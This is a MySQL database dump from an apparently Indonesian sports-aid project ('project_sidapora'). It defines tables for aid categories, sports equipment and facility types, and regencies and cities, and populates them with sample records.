/*
 Navicat Premium Data Transfer

 Source Server         : localhost
 Source Server Type    : MySQL
 Source Server Version : 100134
 Source Host           : localhost:3306
 Source Schema         : project_sidapora

 Target Server Type    : MySQL
 Target Server Version : 100134
 File Encoding         : 65001

 Date: 18/09/2020 17:06:42
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for sdp_master_bantuan
-- ----------------------------
DROP TABLE IF EXISTS `sdp_master_bantuan`;
CREATE TABLE `sdp_master_bantuan`  (
  `bantuan_id` int(11) NOT NULL AUTO_INCREMENT,
  `bantuan_kategori_id` int(11) DEFAULT NULL,
  `bantuan_kode` varchar(5) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `bantuan_nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `bantuan_deskripsi` text CHARACTER SET latin1 COLLATE latin1_swedish_ci,
  `bantuan_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT '1',
  `bantuan_createdby` int(11) DEFAULT NULL,
  `bantuan_createdate` datetime(0) DEFAULT NULL,
  `bantuan_updatedby` int(11) DEFAULT NULL,
  `bantuan_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP(0),
  `bantuan_ip` char(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`bantuan_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_master_bantuan
-- ----------------------------
INSERT INTO `sdp_master_bantuan` VALUES (2, 1, 'PENB1', 'LAPANGAN OUTDOOR', 'LAPANGAN OUTDOOR', '1', NULL, NULL, NULL, '2019-10-13 18:16:36', NULL);
INSERT INTO `sdp_master_bantuan` VALUES (3, 2, 'REKB1', 'LAPANGAN INDOOR (GOR)', 'LAPANGAN INDOOR (GOR)', '1', NULL, NULL, NULL, '2019-10-13 18:27:02', NULL);
INSERT INTO `sdp_master_bantuan` VALUES (5, 2, 'REKB2', 'LAPANGAN OUTDOOR', 'LAPANGAN OUTDOOR', '1', NULL, NULL, NULL, '2019-10-13 18:29:56', NULL);
INSERT INTO `sdp_master_bantuan` VALUES (6, 3, 'PREB1', 'LAPANGAN INDOOR (GOR)', 'LAPANGAN INDOOR (GOR)', '1', NULL, NULL, NULL, '2019-10-13 18:30:12', NULL);
INSERT INTO `sdp_master_bantuan` VALUES (7, 3, 'PREB2', 'LAPANGAN OUTDOOR', 'LAPANGAN OUTDOOR', '1', NULL, NULL, NULL, '2019-10-13 18:30:21', NULL);
INSERT INTO `sdp_master_bantuan` VALUES (9, 1, 'PENB2', 'LAPANGAN INDOOR (GOR)', 'Bantuan olahraga pendidikan dengan bantuan lapangan indoor (GOR)', '1', 1, '2019-10-16 18:25:37', NULL, '2019-10-16 18:25:37', '::1');

-- ----------------------------
-- Table structure for sdp_master_jenis_bantuan
-- ----------------------------
DROP TABLE IF EXISTS `sdp_master_jenis_bantuan`;
CREATE TABLE `sdp_master_jenis_bantuan`  (
  `jnsbtn_id` int(11) NOT NULL AUTO_INCREMENT,
  `jnsbtn_kategori_id` int(11) DEFAULT NULL,
  `jnsbtn_kode` varchar(10) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `jnsbtn_nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `jnsbtn_deskripsi` text CHARACTER SET latin1 COLLATE latin1_swedish_ci,
  `jnsbtn_tipe` enum('1','2') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL COMMENT '1 = prasarana, 2 = sarana',
  `jnsbtn_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT '1',
  `jnsbtn_createdby` int(11) DEFAULT NULL,
  `jnsbtn_createddate` datetime(0) DEFAULT NULL,
  `jnsbtn_updatedby` int(11) DEFAULT NULL,
  `jnsbtn_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP(0),
  `jnsbtn_ip` char(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`jnsbtn_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 22 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_master_jenis_bantuan
-- ----------------------------
INSERT INTO `sdp_master_jenis_bantuan` VALUES (1, 1, 'PEN01', 'BOLA BASKET', 'BOLA BASKET', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (2, 1, 'PEN02', 'BOLA VOLI', 'BOLA VOLI', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (3, 1, 'PEN03', 'BULU TANGKIS', 'BULU TANGKIS', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (4, 1, 'PEN04', 'FUTSAL', 'FUTSAL', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (5, 1, 'PEN05', 'SEPAKBOLA', 'SEPAKBOLA', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (6, 2, 'REK02', 'BOLA VOLI', 'BOLA VOLI\r\n', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (7, 2, 'REK03', 'BULU TANGKIS', 'BULU TANGKIS', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (8, 2, 'REK04', 'FUTSAL', 'FUTSAL', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (9, 2, 'REK06', 'PANJAT DINDING', 'PANJAT DINDING', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (10, 2, 'REK05', 'SEPAKBOLA', 'SEPAKBOLA', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (11, 3, 'PRE06', 'ANGGAR', 'ANGGAR', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (12, 3, 'PRE07', 'Atletik', 'ATLETIK', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (13, 3, 'PRE01', 'BOLA BASKET', 'BOLA BASKET\r\n', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:01', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (14, 3, 'PRE02', 'BOLA VOLI', 'BOLA VOLI\r\n', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:02', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (15, 3, 'PRE03', 'BULU TANGKIS', 'BULU TANGKIS\r\n', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:02', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (16, 3, 'PRE04', 'FUTSAL', 'FUTSAL', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:02', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (17, 3, 'PRE05', 'Sepakbola', 'SEPAKBOLA', '1', '1', NULL, NULL, NULL, '2020-09-14 22:15:02', NULL);
INSERT INTO `sdp_master_jenis_bantuan` VALUES (18, 2, 'REK01', 'Tenis Meja', 'Tenis Meja', '1', '1', 1, '2020-09-14 21:43:15', NULL, '2020-09-14 22:15:02', '::1');
INSERT INTO `sdp_master_jenis_bantuan` VALUES (19, 1, 'SRNPEN01', 'Tenis Meja', 'Tenis Meja', '2', '1', 1, '2020-09-14 22:44:13', 1, '2020-09-14 22:45:11', '::1');
INSERT INTO `sdp_master_jenis_bantuan` VALUES (20, 2, 'SRNREK01', 'Bola Sepak', 'Bola Sepak', '2', '1', 1, '2020-09-14 22:45:34', NULL, '2020-09-14 22:45:34', '::1');
INSERT INTO `sdp_master_jenis_bantuan` VALUES (21, 2, 'SRNREK02', 'Tenis Meja', 'Tenis Meja', '2', '1', 1, '2020-09-14 22:45:57', NULL, '2020-09-14 22:45:57', '::1');

-- ----------------------------
-- Table structure for sdp_master_kabkot
-- ----------------------------
DROP TABLE IF EXISTS `sdp_master_kabkot`;
CREATE TABLE `sdp_master_kabkot`  (
  `kabkot_id` int(11) NOT NULL AUTO_INCREMENT,
  `kabkot_provinsi_kode` varchar(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kabkot_kode` char(2) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kabkot_nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kabkot_latitude` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kabkot_longtitude` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `kabkot_status` enum('0','1') CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT '1',
  `kabkot_createdby` int(11) DEFAULT NULL,
  `kabkot_createddate` datetime(0) DEFAULT NULL,
  `kabkot_updatedby` int(11) DEFAULT NULL,
  `kabkot_lastupdate` timestamp(0) NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP(0),
  `kabkot_ip` char(15) CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  PRIMARY KEY (`kabkot_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 579 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of sdp_master_kabkot
-- ----------------------------
INSERT INTO `sdp_master_kabkot` VALUES (24, NULL, NULL, 'KABUPATEN NIAS', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (26, NULL, NULL, 'KABUPATEN TAPANULI SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (27, NULL, NULL, 'KABUPATEN TAPANULI TENGAH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (28, NULL, NULL, 'KABUPATEN TAPANULI UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (29, NULL, NULL, 'KABUPATEN TOBA SAMOSIR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (30, NULL, NULL, 'KABUPATEN LABUHAN BATU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (32, NULL, NULL, 'KABUPATEN SIMALUNGUN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (33, NULL, NULL, 'KABUPATEN DAIRI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (34, NULL, NULL, 'KABUPATEN KARO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (35, NULL, NULL, 'KABUPATEN DELI SERDANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (37, NULL, NULL, 'KABUPATEN NIAS SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (38, NULL, NULL, 'KABUPATEN HUMBANG HASUNDUTAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (39, NULL, NULL, 'KABUPATEN PAKPAK BHARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (40, NULL, NULL, 'KABUPATEN SAMOSIR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (41, NULL, NULL, 'KABUPATEN SERDANG BEDAGAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (42, NULL, NULL, 'KABUPATEN BATU BARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (44, NULL, NULL, 'KABUPATEN PADANG LAWAS', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (45, NULL, NULL, 'KABUPATEN LABUHAN BATU SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (46, NULL, NULL, 'KABUPATEN LABUHAN BATU UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (47, NULL, NULL, 'KABUPATEN NIAS UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (48, NULL, NULL, 'KABUPATEN NIAS BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (49, NULL, NULL, 'KOTA SIBOLGA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (50, NULL, NULL, 'KOTA TANJUNG BALAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:46', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (52, '11', '10', 'KABUPATEN ACEH SINGKIL', '2.412810', '97.952710', '1', NULL, NULL, 1, '2020-09-17 02:42:55', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (53, '11', '01', 'KABUPATEN ACEH SELATAN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:07:02', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (54, '11', '02', 'KABUPATEN ACEH TENGGARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:08:32', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (55, '11', '03', 'KABUPATEN ACEH TIMUR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:08:59', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (56, '11', '04', 'KABUPATEN ACEH TENGAH', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:07:50', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (57, '11', '05', 'KABUPATEN ACEH BARAT', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:05:25', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (58, '11', '06', 'KABUPATEN ACEH BESAR', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:06:21', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (59, '11', '07', 'KABUPATEN PIDIE', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:10:45', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (60, '11', '11', 'KABUPATEN BIREUEN', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:11:31', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (61, '11', '08', 'KABUPATEN ACEH UTARA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:11:48', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (62, '11', '12', 'KABUPATEN ACEH BARAT DAYA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:05:52', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (63, '11', '13', 'KABUPATEN GAYO LUES', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:11:26', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (64, '11', '16', 'KABUPATEN ACEH TAMIANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:07:29', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (65, '11', '15', 'KABUPATEN NAGAN RAYA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:11:10', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (66, '11', '14', 'KABUPATEN ACEH JAYA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:06:39', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (67, '11', '17', 'KABUPATEN BENER MERIAH', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:11:38', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (68, '11', '18', 'KABUPATEN PIDIE JAYA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:10:56', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (69, '11', '71', 'KOTA BANDA ACEH', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:11:43', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (70, '11', '72', 'KOTA SABANG', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:12:09', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (71, '11', '74', 'KOTA LANGSA', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:11:21', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (72, '11', '73', 'KOTA LHOKSEUMAWE', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:11:16', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (73, '11', '75', 'KOTA SUBULUSSALAM', NULL, NULL, '1', NULL, NULL, 1, '2019-10-20 14:12:40', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (74, NULL, NULL, 'KABUPATEN NIAS', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:47', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (75, '12', '13', 'KABUPATEN MANDAILING NATAL', NULL, NULL, '1', NULL, NULL, 1, '2019-11-20 22:40:25', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (76, NULL, NULL, 'KABUPATEN TAPANULI SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:47', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (77, NULL, NULL, 'KABUPATEN TAPANULI TENGAH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:47', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (78, NULL, NULL, 'KABUPATEN TAPANULI UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:47', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (79, NULL, NULL, 'KABUPATEN TOBA SAMOSIR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:47', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (80, NULL, NULL, 'KABUPATEN LABUHAN BATU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:47', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (81, '12', '09', 'Asahan', NULL, NULL, '1', NULL, NULL, 1, '2019-11-20 22:35:50', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (82, NULL, NULL, 'KABUPATEN SIMALUNGUN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:47', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (83, NULL, NULL, 'KABUPATEN DAIRI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (84, NULL, NULL, 'KABUPATEN KARO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (85, NULL, NULL, 'KABUPATEN DELI SERDANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (86, '12', '05', 'Langkat', NULL, NULL, '1', NULL, NULL, 1, '2019-11-20 22:39:33', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (87, NULL, NULL, 'KABUPATEN NIAS SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (88, NULL, NULL, 'KABUPATEN HUMBANG HASUNDUTAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (89, NULL, NULL, 'KABUPATEN PAKPAK BHARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (90, NULL, NULL, 'KABUPATEN SAMOSIR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (91, NULL, NULL, 'KABUPATEN SERDANG BEDAGAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (92, NULL, NULL, 'KABUPATEN BATU BARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (93, '12', '20', 'KABUPATEN PADANG LAWAS UTARA', NULL, NULL, '1', NULL, NULL, 1, '2019-11-20 22:41:33', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (94, NULL, NULL, 'KABUPATEN PADANG LAWAS', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (95, NULL, NULL, 'KABUPATEN LABUHAN BATU SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (96, NULL, NULL, 'KABUPATEN LABUHAN BATU UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (97, NULL, NULL, 'KABUPATEN NIAS UTARA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (98, NULL, NULL, 'KABUPATEN NIAS BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (99, NULL, NULL, 'KOTA SIBOLGA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (100, NULL, NULL, 'KOTA TANJUNG BALAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (101, NULL, NULL, 'KOTA PEMATANG SIANTAR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (102, NULL, NULL, 'KOTA TEBING TINGGI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (103, NULL, NULL, 'KOTA MEDAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (104, NULL, NULL, 'KOTA BINJAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (105, NULL, NULL, 'KOTA PADANGSIDIMPUAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (106, NULL, NULL, 'KOTA GUNUNGSITOLI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (107, NULL, NULL, 'KABUPATEN KEPULAUAN MENTAWAI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (108, NULL, NULL, 'KABUPATEN PESISIR SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (109, '13', '02', 'KABUPATEN SOLOK', NULL, NULL, '1', NULL, NULL, 1, '2019-11-20 22:43:41', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (110, NULL, NULL, 'KABUPATEN SIJUNJUNG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (111, NULL, NULL, 'KABUPATEN TANAH DATAR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (112, NULL, NULL, 'KABUPATEN PADANG PARIAMAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (113, NULL, NULL, 'KABUPATEN AGAM', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (114, NULL, NULL, 'KABUPATEN LIMA PULUH KOTA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (115, '13', '08', 'KABUPATEN PASAMAN', NULL, NULL, '1', NULL, NULL, 1, '2019-11-20 22:42:54', '::1');
INSERT INTO `sdp_master_kabkot` VALUES (116, NULL, NULL, 'KABUPATEN SOLOK SELATAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:48', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (117, NULL, NULL, 'KABUPATEN DHARMASRAYA', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (118, NULL, NULL, 'KABUPATEN PASAMAN BARAT', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (119, NULL, NULL, 'KOTA PADANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (120, NULL, NULL, 'KOTA SOLOK', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (121, NULL, NULL, 'KOTA SAWAH LUNTO', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (122, NULL, NULL, 'KOTA PADANG PANJANG', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (123, NULL, NULL, 'KOTA BUKITTINGGI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (124, NULL, NULL, 'KOTA PAYAKUMBUH', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (125, NULL, NULL, 'KOTA PARIAMAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (126, NULL, NULL, 'KABUPATEN KUANTAN SINGINGI', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (127, NULL, NULL, 'KABUPATEN INDRAGIRI HULU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (128, NULL, NULL, 'KABUPATEN INDRAGIRI HILIR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (129, NULL, NULL, 'KABUPATEN PELALAWAN', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (130, NULL, NULL, 'KABUPATEN S I A K', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (131, NULL, NULL, 'KABUPATEN KAMPAR', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
INSERT INTO `sdp_master_kabkot` VALUES (132, NULL, NULL, 'KABUPATEN ROKAN HULU', NULL, NULL, '1', NULL, NULL, NULL, '2019-10-20 11:32:49', NULL);
